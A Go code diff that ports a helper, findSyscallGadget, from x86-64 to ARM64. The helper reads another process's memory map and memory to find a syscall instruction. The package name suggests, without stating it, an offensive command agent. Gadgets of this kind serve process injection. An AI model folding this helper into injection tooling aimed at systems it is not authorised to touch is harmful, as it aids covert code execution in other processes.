@@ -1,4 +1,4 @@
-//go:build linux && amd64
+//go:build linux && arm64
 
 package commands
 
@@ -10,7 +10,7 @@ import (
 	"fawkes/pkg/structs"
 )
 
-// findSyscallGadget scans r-xp memory regions for an x86-64 syscall instruction (0x0F 0x05).
+// findSyscallGadget scans r-xp memory regions for an ARM64 SVC #0 instruction (0x01 0x00 0x00 0xD4).
 func findSyscallGadget(pid int) (uint64, error) {
 	mapsPath := fmt.Sprintf("/proc/%d/maps", pid)
 	data, err := os.ReadFile(mapsPath)
@@ -41,7 +41,7 @@ func findSyscallGadget(pid int) (uint64, error) {
 		}
 		if len(parts) >= 6 {
 			name := parts[len(parts)-1]
-			if strings.Contains(name, "vdso") || strings.Contains(name, "vsyscall") {
+			if strings.Contains(name, "vdso") {
 				continue
 			}
 		}
@@ -60,22 +60,27 @@ func findSyscallGadget(pid int) (uint64, error) {
 
 		chunkSize := uint64(4096)
 		buf := make([]byte, chunkSize)
-		for addr := startAddr; addr < endAddr-1; addr += chunkSize {
+		for addr := startAddr; addr < endAddr-3; addr += chunkSize {
 			readSize := chunkSize
 			if addr+readSize > endAddr {
 				readSize = endAddr - addr
 			}
 			n, err := memFile.ReadAt(buf[:readSize], int64(addr))
-			if err != nil || n < 2 {
+			if err != nil || n < 4 {
 				break
 			}
-			for i := 0; i < n-1; i++ {
-				if buf[i] == 0x0F && buf[i+1] == 0x05 {
+			// ARM64 instructions are 4-byte aligned
+			alignStart := 0
+			if offset := addr % 4; offset != 0 {
+				alignStart = int(4 - offset)
+			}
+			for i := alignStart; i <= n-4; i += 4 {
+				if buf[i] == 0x01 && buf[i+1] == 0x00 && buf[i+2] == 0x00 && buf[i+3] == 0xD4 {
 					return addr + uint64(i), nil
 				}
 			}
 		}
 	}
 
-	return 0, fmt.Errorf("no syscall gadget found in process %d", pid)
+	return 0, fmt.Errorf("no SVC gadget found in process %d", pid)
 }
